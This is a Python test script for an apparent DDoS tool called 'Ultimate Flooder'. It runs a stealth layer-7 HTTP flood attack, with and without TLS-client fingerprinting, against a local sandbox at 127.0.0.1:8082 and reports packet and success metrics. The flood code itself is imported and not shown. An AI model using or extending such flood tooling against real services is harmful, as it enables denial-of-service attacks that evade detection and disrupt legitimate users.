#!/usr/bin/env python3
"""
Quick test script for sandbox server
"""

import requests
import time
from src.attacks.layer7 import StealthHTTPFloodAttack

def test_basic_request():
    print("Testing basic request to sandbox...")
    try:
        response = requests.get('http://127.0.0.1:8082', timeout=5)
        print(f"✓ Response: {response.status_code} - {response.text}")
        return True
    except Exception as e:
        print(f"✗ Failed: {e}")
        return False

def test_stealth_attack():
    print("\nTesting Stealth HTTP Flood Attack (without TLS)...")
    try:
        attack = StealthHTTPFloodAttack(
            target='http://127.0.0.1:8082',
            threads=2,
            duration=2,
            stealth_mode=True,
            use_tls_client=False
        )

        print("Starting attack...")
        attack.start()

        start_time = time.time()
        while attack.is_running and (time.time() - start_time) < 5:
            time.sleep(0.5)

        if attack.is_running:
            attack.stop()

        metrics = attack.get_metrics()
        print("✓ Attack completed!")
        print(f"  Packets sent: {metrics['packets_sent']}")
        print(f"  Bytes sent: {metrics['bytes_sent']}")
        print(f"  PPS: {metrics['pps']:.1f}")
        print(f"  Success rate: {metrics['success_rate']:.1f}%")
        return True

    except Exception as e:
        print(f"✗ Attack failed: {e}")
        return False

def test_tls_attack():
    print("\nTesting Stealth HTTP Flood Attack (with TLS-Client)...")
    try:
        attack = StealthHTTPFloodAttack(
            target='http://127.0.0.1:8082',
            threads=2,
            duration=2,
            stealth_mode=True,
            use_tls_client=True
        )

        print("Starting TLS attack...")
        attack.start()

        start_time = time.time()
        while attack.is_running and (time.time() - start_time) < 5:
            time.sleep(0.5)

        if attack.is_running:
            attack.stop()

        metrics = attack.get_metrics()
        print("✓ TLS Attack completed!")
        print(f"  Packets sent: {metrics['packets_sent']}")
        print(f"  Bytes sent: {metrics['bytes_sent']}")
        print(f"  PPS: {metrics['pps']:.1f}")
        print(f"  Success rate: {metrics['success_rate']:.1f}%")
        return True

    except Exception as e:
        print(f"✗ TLS Attack failed: {e}")
        return False

if __name__ == "__main__":
    print("🚀 Ultimate Flooder Sandbox Test")
    print("=" * 40)

    success1 = test_basic_request()
    success2 = test_stealth_attack()
    success3 = test_tls_attack()

    print("\n" + "=" * 40)
    if success1 and success2 and success3:
        print("✅ All tests passed!")
    else:
        print("❌ Some tests failed!")